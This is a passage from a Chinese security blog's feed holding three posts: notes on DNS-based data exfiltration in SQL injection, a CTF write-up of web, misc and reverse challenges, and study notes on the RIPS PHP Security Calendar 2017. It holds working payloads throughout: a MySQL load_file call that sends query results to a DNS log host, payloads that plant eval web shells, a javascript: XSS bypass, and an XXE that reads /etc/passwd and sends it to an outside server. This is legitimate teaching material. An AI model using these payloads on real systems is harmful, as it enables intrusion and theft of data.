<p>除了Oracle 支持 windows 和 Linux 系统的攻击以外其他攻击<strong>只能在Windows环境下</strong></p>
<p>并且数据中不能包含:~@等特殊字符。</p>
</blockquote>
<p>原理：</p>
<p>因为DNS查询是可以在DNS服务器之前转发的，那么DNS报文就能从安全系统内转发出来。DNS在解析时会留下日志，通过读取多级域名的解析日志，获取请求信息。即使假设服务器不允许连接公网，如果目标主机能够解析任意域名，也能够通过 DNS 查询转发进行数据外带。而这种 DNS 外带的方式，可以使得攻击者通过从易受攻击的数据库管理系统发出特制的DNS请求，攻击者可以在另一端拦截来查看恶意SQL查询（例如管理员密码）的结果。</p>
<p><img src="https://i.loli.net/2020/01/08/1jepZE8CDhKLMmV.png"></p>
<p>Mysql相对于Oracle来说可利用方法单一且需要一定的条件。</p>
<p><code>secure_file_priv</code>设置为空。</p>
<p>示例：</p>
<p>使用DnsLog平台：<a href="http://ceye.io/">http://ceye.io</a></p>
<pre><code> select load_file(concat(&#39;\\\\&#39;,(select version()),&#39;.juqh6m.ceye.io\\abc&#39;));</code></pre>
<p><img src="https://i.loli.net/2020/01/08/NqI3KODrRvVe8A1.png"><br><img src="https://i.loli.net/2020/01/08/v34gqLR9MB1sDkF.png"></p>
<p><strong>参考链接</strong></p>
<blockquote>
<p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
<p><a href="http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/">http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/</a></p>
<p><a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
<p><a href="https://p0sec.net/index.php/archives/106/">https://p0sec.net/index.php/archives/106/</a></p>
<p><a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf">https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf</a></p>
</blockquote>
<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3>]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>Sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>小组内部赛(04-16)WriteUp</title>
    <url>/2017/04/20/xiao-zu-nei-bu-sai-04-16-writeup/</url>
    <content><![CDATA[<h1 id="小组内部赛-04-16-WriteUp"><a href="#小组内部赛-04-16-WriteUp" class="headerlink" title="小组内部赛(04-16)WriteUp"></a>小组内部赛(04-16)WriteUp</h1><h2 id="0X01-WEB"><a href="#0X01-WEB" class="headerlink" title="0X01 WEB"></a>0X01 WEB</h2><h4 id="1-土豪才能用的机器（50分）"><a href="#1-土豪才能用的机器（50分）" class="headerlink" title="1.土豪才能用的机器（50分）"></a>1.土豪才能用的机器（50分）</h4><p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/223925082.png" alt="mark"></p>
<p>​    提到了MAC，第一个想到的burp抓包，改UA，不行。那这里就肯定是关于什么windows和MAC OS的差异了。后来知道了<a href="http://baike.baidu.com/link?url=awCBaGWuc6cZQA4MPfltaz-0qsv9GC2LwMzKrK3mAdry9lmQ4GWK6NYXS8x0zsi2OxkZTMCONS2GFjF7MwBYeCJMqzFRZMQG93Ut_YdiKsW">.DS_Store</a>后缀的文件是MAC才会产生的一类文件，<code>http://115.159.197.62:7001/.DS_Store</code>下载下来该文件，打开就get到flag了。</p>
<blockquote>
<p>这个真的是涨姿势了，第一次见。</p>
</blockquote>
<h4 id="2-必须是数字（150分）"><a href="#2-必须是数字（150分）" class="headerlink" title="2.必须是数字（150分）"></a>2.必须是数字（150分）</h4><p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/224840375.png" alt="mark"></p>
<p>打开后除了这个没别的，首先看一下源码，发现有东西。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/225004984.png" alt="mark"></p>
<p>vim，you love vim！肯定有关系。这里想到vim备份文件<code>.swp</code>（和上次zctf的蛤一样），<code> .index.php.swp</code>下下来源码看看。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/225843618.png" alt="mark"></p>
<p>提到了f149.php，访问看源码，考察代码审计。</p>
<pre><code>&lt;!--
    if (isset ($_GET[&#39;flag&#39;])) &#123;
    if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;flag&#39;]) === FALSE)
        echo &#39;only number is admitted&#39;;
    else if (strpos ($_GET[&#39;flag&#39;], &#39;flag&#39;) !== FALSE)
        die(&#39;Flag: &#39;.$flag);
    else
        echo &#39;getflag fail~&#39;;
&#125;



--&gt;</code></pre>
<p>​    要求提交的数据只能是数字 还得要包含flag字符串，这里利用00截断来实现。提交<code>115.159.197.62:8008/f149.php?flag=1%00flag</code>得到flag。不过当时用的flag[]也得到了flag。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/234217075.png" alt="mark"></p>
<h4 id="3-输入密码（150分）"><a href="#3-输入密码（150分）" class="headerlink" title="3.输入密码（150分）"></a>3.输入密码（150分）</h4><p>​    这个题本身不难，但是。。太套路。源码</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
check
&lt;/head&gt;
&lt;body&gt;
please input the password
&lt;/body&gt;
&lt;/html&gt;
&lt;!--

    if (isset($_GET[&#39;a&#39;])) &#123;  
    if (strcmp($_GET[&#39;a&#39;], $flag) == 0)  
        die(&#39;Flag: &#39;.$flag);  
    else  
        print &#39;you are close&#39;;  
    &#125;

--&gt;</code></pre>
<p>看到strcmp()函数应该明白该干什么了（会心一笑），利用php弱类型。</p>
<blockquote>
<p>strcmp()函数在PHP官方手册中的描述是int strcmp ( string $str1 , string $str2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。</p>
<pre><code>$array=[1,2,3];
var_dump(strcmp($array,&#39;123&#39;)); //null,在某种意义上null也就是相当于false。</code></pre>
</blockquote>
<p>套路在哪呢？post的不是a[]，而是password[],谁让他说了输入密码（password）呢。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170418/000801070.png" alt="mark"></p>
<h4 id="4-请努力的微笑（150分）"><a href="#4-请努力的微笑（150分）" class="headerlink" title="4.请努力的微笑（150分）"></a>4.请努力的微笑（150分）</h4><p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170418/205305667.png" alt="mark"></p>
<p>​    既然能看源码，那看看源码，如下。</p>
<pre><code>﻿&lt;?php   
    error_reporting(0); 
    header(&quot;Content-type: text/html; charset=utf-8&quot;); 
    if (isset($_GET[&#39;view-source&#39;])) &#123;  
        show_source(__FILE__);  
        exit();  
    &#125;  

    include(&#39;flag.php&#39;);  

    $smile = 1;   

   if (!isset ($_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/\./&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/%/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/[0-9]/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/http/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;   
    if (preg_match (&#39;/https/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;   
    if (preg_match (&#39;/ftp/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/telnet/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/_/&#39;, $_SERVER[&#39;QUERY_STRING&#39;])) $smile = 0;  
    if ($smile) &#123;  
        if (@file_exists ($_GET[&#39;^_^&#39;])) $smile = 0;   
    &#125;   
    if ($smile) &#123;  
        $smile = @file_get_contents ($_GET[&#39;^_^&#39;]);   
        if ($smile === &quot;(~^o^~)&quot;) die($flag);   
    &#125;   
?&gt;   
&lt;!doctype html&gt;  
&lt;html lang=&quot;en&quot;&gt;  

&lt;head&gt;  
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;  
&lt;title&gt;Show me your smile :)&lt;/title&gt;  
&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;  
&lt;/head&gt;  

&lt;body&gt;  
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;  
&lt;div class=&quot;loginform cf&quot;&gt;  
    &lt;form name=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot; accept-charset=&quot;utf-8&quot;&gt;  
        &lt;ul&gt;  
            &lt;li&gt;  
                &lt;label for=&quot;SMILE&quot;&gt;请使用微笑过关&lt;a href=&quot;?view-source&quot;&gt;view&lt;/a&gt;&lt;/label&gt;  
                &lt;input type=&quot;text&quot; name=&quot;T_T&quot; placeholder=&quot;where is your smile&quot; required&gt;  
            &lt;/li&gt;  
            &lt;li&gt;&lt;input type=&quot;submit&quot; value=&quot;Show&quot;&gt; &lt;/li&gt;  
        &lt;/ul&gt;  
    &lt;/form&gt;  
&lt;/div&gt;  
&lt;div style=&quot;text-align:center;clear:both&quot;&gt;  
&lt;/div&gt;  
&lt;/body&gt;  

&lt;/html&gt; </code></pre>
<p>看一下要满足的条件：</p>
<p>1.参数为^_^</p>
<p>2.提交的数据中不能有<code>. % [0-9] http https ftp telnet</code>，</p>
<p>3.^_^中的<code>_</code>不能出现，因为<code>if (preg_match (&#39;/_/&#39;, $_SERVER[&#39;QUERY_STRING&#39;])) $smile = 0;  </code></p>
<p>4<code>.if (@file_exists ($_GET[&#39;^_^&#39;])) $smile = 0; </code>,所以要满足<code>$_GET[&#39;^_^&#39;]</code>不存在</p>
<p>5<code>.$smile</code>不为0</p>
<p>6.<code>$smile</code>的值是(<del>^o^</del>)</p>
<p>综上，3可以用url编码替代下划线，4和其他矛盾，6要读取文件，只能写入或包含。payload：<code>?^%5F^=data://filter/text/plain,(%7e%5eo%5e%7e)</code>,<a href="http://php.net/manual/zh/wrappers.php">参考php支持的协议</a>.</p>
<blockquote>
<p><strong>file_get_contents()</strong> 把文件读入一个字符串。将在参数 <code>offset</code> 所指定的位置开始读取长度为 <code>maxlen</code> 的内容。如果失败，<strong>file_get_contents()</strong> 将返回 <strong>FALSE</strong>。</p>
<p>file_exists() 函数检查文件或目录是否存在。</p>
<p>如果指定的文件或目录存在则返回 true，否则返回 false。</p>
<p>$_SERVER[“QUERY_STRING”]</p>
<p>说明：查询(query)的字符串</p>
</blockquote>
<h4 id="5-泄露了点什么东西（150分）"><a href="#5-泄露了点什么东西（150分）" class="headerlink" title="5.泄露了点什么东西（150分）"></a>5.泄露了点什么东西（150分）</h4><p>​    源码泄露，index.zipx下载源码。</p>
<pre><code>&lt;?php
extract($_GET);
include(&#39;flag.php&#39;);
if (!empty($dpc))
&#123;
$combination = trim(file_get_contents($filename));
if ($dpc === $combination)
&#123;
echo &quot;&lt;p&gt;Hello:&quot; .&quot; $combination!?&lt;/p&gt;&quot;;
echo &quot;&lt;p&gt;Congratulation!!! flag is:&quot; .&quot; $flag&lt;/p&gt;&quot;;
&#125;
else
&#123;
echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
&#125;
&#125;
?&gt;</code></pre>
<p>变量覆盖，构造payload：?dpc=1&amp;filename=php://input，post：1.</p>
<h4 id="6-php-regrex（200分）"><a href="#6-php-regrex（200分）" class="headerlink" title="6.php regrex（200分）"></a>6.php regrex（200分）</h4><p>正则表达式，源码~</p>
<pre><code>
regrex is good~~&lt;!--

$str = highlight_file(&#39;2.php&#39;,true);
$key=&#39;KEY&#123;********************************&#125;&#39;;
$IsMatch= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]));
if( $IsMatch )&#123;
  die(&#39;key: &#39;.$str);
&#125;


--&gt;
</code></pre>
<p>payload:<code>?id=keykeykeykeykeykeykey:/a/aakeya:]</code></p>
<h4 id="7-信息收录（150分）"><a href="#7-信息收录（150分）" class="headerlink" title="7.信息收录（150分）"></a>7.信息收录（150分）</h4><pre><code>function new_addslashes($string)&#123;
    if(!is_array($string)) 
        return addslashes($string);
    foreach($string as $key =&gt; $val) 
        $string[$key] = new_addslashes($val);
    return $string;
&#125;

$_POST = new_addslashes($_POST);
$_GET = new_addslashes($_GET);
$_REQUEST = new_addslashes($_REQUEST);
$_COOKIE = new_addslashes($_COOKIE);

$data = isset($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : &#39;&#39;;
$user_config = &quot;&lt;\?php \n&quot;;
foreach($data as $key =&gt; $value)&#123;
    $key = strtoupper($key);
    $user_config .= &quot;define($key, &#39;$value&#39;);\n&quot;; 
&#125;

@file_put_contents(&#39;user_config.php&#39;, $user_config);</code></pre>
<p>data的传递是用数组的形式，过滤只过滤了val的值，并没有过滤key，利用这getshell，post：</p>
<pre><code>data[&#39;name&#39;,&#39;1&#39;);/*]=*/eval($_POST[a]);//</code></pre>
<p>这里，<code>$user_config .= &quot;define($key, &#39;$value&#39;);\n&quot;; </code>这句话里，传进去的data把]注释了，然后代码就被改成了<code>$user_config .= &quot;define($key, &#39;1&#39;);/*]=*/eval($_POST[a]);//);\n&quot;;</code>,这样一句话就写入了user_config页面，菜刀连接。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170420/234334412.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170420/234349851.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170420/234400769.png" alt="mark"></p>
<h4 id="8-壁纸大全（200分）"><a href="#8-壁纸大全（200分）" class="headerlink" title="8.壁纸大全（200分）"></a>8.壁纸大全（200分）</h4><p>壁纸可以下载，考虑到任意文件下载漏洞。查看下载链接得知<code>/download.php?url=filename </code>可以下载文件。</p>
<ul>
<li>index.php</li>
<li>display.php</li>
<li>download.php</li>
<li>config.inc.php</li>
<li>api.php</li>
<li>json</li>
</ul>
<p>当时乱试不知道下什么。</p>
<p>注意一些关键的文件名。下下来后进行代码审计，突破口在api.php。</p>
<pre><code>&lt;?php
error_reporting(0);
include &quot;json.php&quot;;
$config = include &quot;config.inc.php&quot;;
if (isset($_GET[&#39;img_first&#39;]) and isset($_GET[&#39;img_num&#39;]))&#123;
$img_first = $_GET[&#39;img_first&#39;];
$img_num = $_GET[&#39;img_num&#39;];
$conn = mysqli_connect($config[&#39;db_host&#39;],$config[&#39;db_user&#39;],$config
if (mysqli_connect_errno($conn))&#123;
die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
&#125;
$check = is_numeric($img_num) and is_numeric($img_first);
if (!$check)&#123;
$img_num = intval($img_num);
$img_first = intval($img_first);
&#125;
 $sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;
$result = mysqli_query($conn,$sql);
$i = 0;
while($row=mysqli_fetch_array($result,MYSQLI_ASSOC))&#123;
$rows[$i] = $row;
$i++;
&#125;
$json = new Services_JSON();
echo $json-&gt;encode(array(&#39;result&#39;=&gt;$rows));
//echo json_encode(array(&#39;result&#39;=&gt;$rows),JSON_UNESCAPED_SLASHES);
&#125;else &#123;
die(&quot;Missing parameter img_first or img_num&quot;);
&#125;</code></pre>
<p>get了2个参数，<code>img_first</code>和<code>img_num</code>,<code>$check =………… </code>对参数做了过滤，如果不为数字，转为数字。</p>
<p>这里涉及到运算符优先级的问题，and不如=优先级高，导致逻辑问题，只要满足img_num为数字就行。img_first就可以用它来嘿嘿嘿了。<a href="http://php.net/manual/zh/language.operators.precedence.php">运算符优先级</a></p>
<pre><code>一个例子说明and的优先级不同。
Watch out for the difference of priority between &#39;and vs &amp;&amp;&#39; or &#39;|| vs or&#39;:
&lt;?php
$bool = true &amp;&amp; false;
var_dump($bool); // false, that&#39;s expected

$bool = true and false;
var_dump($bool); // true, ouch!
?&gt;
Because &#39;and/or&#39; have lower priority than &#39;=&#39; but &#39;||/&amp;&amp;&#39; have higher.</code></pre>
<pre><code>api.php?img_num=1&amp;img_first=0,1 UNION SELECT (select
0x3c3f706870206576616c28245f504f53545b2761275d293b3f3e into
outfile &#39;//var//www//html//images//p0.php&#39;)</code></pre>
<p>菜刀连接。</p>
<h2 id="0X02-Misc"><a href="#0X02-Misc" class="headerlink" title="0X02 Misc"></a>0X02 Misc</h2><h4 id="1-八十年代的歌（20分）"><a href="#1-八十年代的歌（20分）" class="headerlink" title="1.八十年代的歌（20分）"></a>1.八十年代的歌（20分）</h4><p>文件格式改为zip，打开后得到flag。</p>
<h4 id="2-来夺旗啊（70分）"><a href="#2-来夺旗啊（70分）" class="headerlink" title="2.来夺旗啊（70分）"></a>2.来夺旗啊（70分）</h4><p>利用明文攻击，2个方法。</p>
<blockquote>
<p>2篇资料</p>
<p><a href="http://blog.csdn.net/ETF6996/article/details/54847911">http://blog.csdn.net/ETF6996/article/details/54847911</a></p>
<p><a href="https://github.com/evalsafe/TopicShare/blob/master/2015.10.10-ZIP%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB-xmsec.md">https://github.com/evalsafe/TopicShare/blob/master/2015.10.10-ZIP%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB-xmsec.md</a></p>
</blockquote>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/143558462.jpg"></p>
<h4 id="3-神秘的代码（100分）"><a href="#3-神秘的代码（100分）" class="headerlink" title="3.神秘的代码（100分）"></a>3.神秘的代码（100分）</h4><p>一个图片隐写题。</p>
<p>给出了一串字符</p>
<pre><code>789c9d940b0e80300843af04f1fe7733313196f6cd5fc874930e3ae8dc6afb673dac8e717acea7631475216abc13a3b12eafee6bc4f017cffbb44bd93b738fac5ee7cfe7ca1ae6f01adef7a41628cd32f934fa1a7666169d3943d247430caf8acf9517afbd7e8a59ad93a9abd63badb3b779e85c69a49d8ce7f57cab8954a2736436f3acb312d4ad44937ee8eeccbb9c78ba9515fe953af91fa11ee7c1fd48544734d73b292cb37cb21d0a2d1b33</code></pre>
<p>根据提示IDAT，python进行zlib解压。</p>
<pre><code>#! /usr/bin/env python
import zlib
import binascii
IDAT = &quot;789c9d940b0e80300843af04f1fe7733313196f6cd5fc874930e3ae8dc6afb673dac8e717acea7631475216abc13a3b12eafee6bc4f017cffbb44bd93b738fac5ee7cfe7ca1ae6f01adef7a41628cd32f934fa1a7666169d3943d247430caf8acf9517afbd7e8a59ad93a9abd63badb3b779e85c69a49d8ce7f57cab8954a2736436f3acb312d4ad44937ee8eeccbb9c78ba9515fe953af91fa11ee7c1fd48544734d73b292cb37cb21d0a2d1b33&quot;.decode(&#39;hex&#39;)
#print IDAT
result = binascii.hexlify(zlib.decompress(IDAT))
print resul</code></pre>
<p>输出的结果除了1，0还有3。</p>
<pre><codecode></pre>
<p>ascii码30-&gt;0,31-&gt;1,33-&gt;3，所以全部转换成数字，转换后的数字两两成对，不是30就是31，在转换一次，就全部转换为1和0了。共729个数，是27的平方，应该是个正方形的图片，二维码吧。用python的PIL库可以完成画图。Windows要装PIL库，kali自带。</p>
<pre><code>#!/usr/bin/env python
import Image
MAX = 27
pic = Image.new(&quot;RGB&quot;,(MAX, MAX))
str = &quotquot;
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == &#39;1&#39;):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1

pic.show()
pic.save(&quot;flag.png&quot;)</code></pre>
<p>得到flag。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/185550739.png" alt="mark"></p>
<h2 id="0X03-Reverse"><a href="#0X03-Reverse" class="headerlink" title="0X03 Reverse"></a>0X03 Reverse</h2><h4 id="1-固件分析（150分）"><a href="#1-固件分析（150分）" class="headerlink" title="1.固件分析（150分）"></a>1.固件分析（150分）</h4><p>下载一个.bin的文件，binwalk打开。binwalk是一个固件分析工具。</p>
<p><a href="http://www.freebuf.com/sectool/15266.html">http://www.freebuf.com/sectool/15266.html</a></p>
<p>用binwalk提取文件，打开后有一个decode.py和encodeflag文件，明白了~~</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/212920773.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/212946150.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170419/212957170.png" alt="mark"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RIPS-PHP-SECURITY-CALENDAR-2017学习记录.md</title>
    <url>/2020/02/19/rips-php-security-calendar-2017-xue-xi-ji-lu/</url>
    <content><![CDATA[<blockquote>
<p>题目地址： <a href="https://www.ripstech.com/php-security-calendar-2017/">https://www.ripstech.com/php-security-calendar-2017/</a></p>
<p>RIPS团队在17年12月1-24日发布的新年礼物–每日一个PHP代码挑战，包含了一些新颖的知识点。</p>
</blockquote>
<h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><p><strong>code:</strong></p>
<pre><code class="php">class Challenge &#123;
  const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;
  private $file;
  private $whitelist;

  public function __construct($file) &#123;
    $this-&gt;file = $file;
    $this-&gt;whitelist = range(1, 24);
  &#125;

  public function __destruct() &#123;
    if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) &#123;
      move_uploaded_file(
        $this-&gt;file[&#39;tmp_name&#39;],
        self::UPLOAD_DIRECTORY . $this-&gt;file[&#39;name&#39;]
      );
    &#125;
  &#125;
&#125;

$challenge = new Challenge($_FILES[&#39;solution&#39;]);</code></pre>
<p><strong>漏洞：</strong></p>
<p>存在任意文件上传漏洞，造成漏洞的代码：</p>
<pre><code class="php">if (in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)) &#123;</code></pre>
<p>代码的目的是想要通过 <code>in_array()</code> 来判断文件名是否为整数，但是这里<code>in_array()</code>函数未设置第三个参数，导致了安全问题。</p>
<p><code>in_array</code>函数在第三个参数未设置时默认为false，在比较的时候使用宽松比较，在比较文件名时会进行类型转换，例如<code>6shell.php</code>就会通过比较成功上传，下面是手册中的函数定义。</p>
<blockquote>
<p> <strong>in_array</strong></p>
<p>in_array — 检查数组中是否存在某个值</p>
<p><strong>说明</strong></p>
<p>bool in_array ( <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] )</p>
<p>在 <code>haystack</code> 中搜索 <code>needle</code>，如果没有设置 <code>strict</code> 则使用宽松的比较。</p>
</blockquote>
<h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><p><strong>code:</strong></p>
<pre><code class="php">// composer require &quot;twig/twig&quot;
require &#39;vendor/autoload.php&#39;;

class Template &#123;
  private $twig;

  public function __construct() &#123;
    $indexTemplate = &#39;&lt;img &#39; .
      &#39;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#39; .
      &#39;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#39;;

    // Default twig setup, simulate loading
    // index.html file from disk
    $loader = new Twig\Loader\ArrayLoader([
      &#39;index.html&#39; =&gt; $indexTemplate
    ]);
    $this-&gt;twig = new Twig\Environment($loader);
  &#125;

  public function getNexSlideUrl() &#123;
    $nextSlide = $_GET[&#39;nextSlide&#39;];
    return filter_var($nextSlide, FILTER_VALIDATE_URL);
  &#125;

  public function render() &#123;
    echo $this-&gt;twig-&gt;render(
      &#39;index.html&#39;,
      [&#39;link&#39; =&gt; $this-&gt;getNexSlideUrl()]
    );
  &#125;
&#125;

(new Template())-&gt;render();</code></pre>
<p><strong>漏洞：</strong></p>
<p><code>twig</code> 是 PHP 的一个模板引擎。该代码存在XSS漏洞。</p>
<p>代码中有两处过滤，第一处在<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>，使用了FILTER_VALIDATE_URL 过滤器，没有使用标志来检验url，所以此处过滤很弱，只验证了<code>：//</code></p>
<blockquote>
<p> <a href="http://php.net/manual/zh/function.filter-var.php">*filter_var** </a>： (PHP 5 &gt;= 5.2.0, PHP 7)</p>
<p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p>
<p><strong>定义</strong> [mixed <strong>filter_var</strong> ( mixed<code>$variable</code> [, int <code>$filter</code> = FILTER_DEFAULT [, mixed <code>$options</code> ]] )</p>
</blockquote>
<pre><code class="php">php &gt; var_dump(filter_var(&#39;qaq://lanvnal&#39;,FILTER_VALIDATE_URL));
string(13) &quot;qaq://lanvnal&quot;</code></pre>
<p>第二处过滤是<code>&#123;&#123;link|escape&#125;&#125;</code>，这是twig自带的过滤器，在<a href="https://twig.symfony.com/doc/2.x/filters/escape.html">twig的文档</a>中我们可以知道它是通过PHP的<code>htmlspecialchars</code>来实现的，他会将特殊字符转换为 HTML 实体。</p>
<pre><code>Internally, escape uses the PHP native htmlspecialchars function for the HTML escaping strategy.</code></pre>
<blockquote>
<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php"><strong>htmlspecialchars</strong> </a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：将特殊字符转换为 HTML 实体</p>
<p><strong>定义</strong> ：string <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> = ini_get(“default_charset”) [, bool <code>$double_encode</code> = <strong>TRUE</strong> ]]] )</p>
<pre><code>&amp; (&amp; 符号)  ===============  &amp;amp;
&quot; (双引号)  ===============  &amp;quot;
&#39; (单引号)  ===============  &amp;apos;
&lt; (小于号)  ===============  &amp;lt;
&gt; (大于号)  ===============  &amp;gt;</code></pre>
</blockquote>
<p>可以使用JavaScript伪协议绕过。eg：</p>
<pre><code>&lt;a href=&quot;javascript:;&quot;&gt;这个标签中的javascript是啥意思？&lt;/a&gt;

href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。
这里的href=”javascript:;”，其中javascript:是伪协议，它可以让我们通过一个链接来调用javascript函数。javascript:是表示在触发&lt;a&gt;默认动作时，执行一段JavaScript代码</code></pre>
<p>所以绕过两处过滤的payload为：<code>nextSlide=javascript://aaa％250aalert(1)</code>（%25是%的url编码）</p>
<p><code>://</code>绕过了<code>FILTER_VALIDATE_URL</code>过滤器，经过<code>escape</code>过滤器后link值为<code>javascript://aaa%0aalert(1)</code>，%0a为换行符，<code>//</code>注释掉了换行前面的内容，然后点击a标签链接就会触发XSS。</p>
<h2 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h2><p><strong>Code:</strong></p>
<pre><code class="php">function __autoload($className) &#123;
    include $className;
&#125;

$controllerName = $_GET[&#39;c&#39;];
$data = $_GET[&#39;d&#39;];

if (class_exists($controllerName)) &#123;
    $controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);
    $controller-&gt;render();
&#125; else &#123;
    echo &#39;There is no page with this name&#39;;
&#125;

class HomeController &#123;
    private $template;
    private $variables;

    public function __construct($template, $variables) &#123;
        $this-&gt;template = $template;
        $this-&gt;variables = $variables;
    &#125;

    public function render() &#123;
        if ($this-&gt;variables[&#39;new&#39;]) &#123;
            echo &#39;controller rendering new response&#39;;
        &#125; else &#123;
            echo &#39;controller rendering old response&#39;;
        &#125;
    &#125;
&#125;</code></pre>
<p><strong>漏洞：</strong></p>
<p>第一个是文件包含，需要特定PHP版本（PHP5~5.3包含5.3版本）。</p>
<p> <strong>class_exists()</strong> 函数来判断用户传过来的控制器是否存在，默认情况下，如果程序存在 <strong>__autoload</strong> 函数，那么在使用 <strong>class_exists()</strong> 函数就会自动调用本程序中的 <strong>__autoload</strong> 函数，这题的文件包含漏洞就出现在这个地方。</p>
<p>payload：<code>../../../../../../passwd</code></p>
<p>第二个漏洞在<code>$controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);</code></p>
<p>实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP的内置函数，并通过上面代码实例化。我们可以借助PHP中的<code>SimpleXMLElement</code>类来完成XXE攻击。</p>
<p>payload：</p>
<pre><code>http://localhost/test2.php?c=SimpleXMLElement&amp;d=&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % remote SYSTEM &quot;http://外网地址/evil.dtd&quot;&gt;
%remote;
%send;
]&gt;</code></pre>
<p>其中的<code>evil.dtd</code>内容是:</p>
<pre><code>&lt;!ENTITY % all
        &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;外网地址/1.php?file=%file;&#39;&gt;&quot;
        &gt;
        %all;</code></pre>
<p>其中的<code>1.php</code>的地址是：</p>
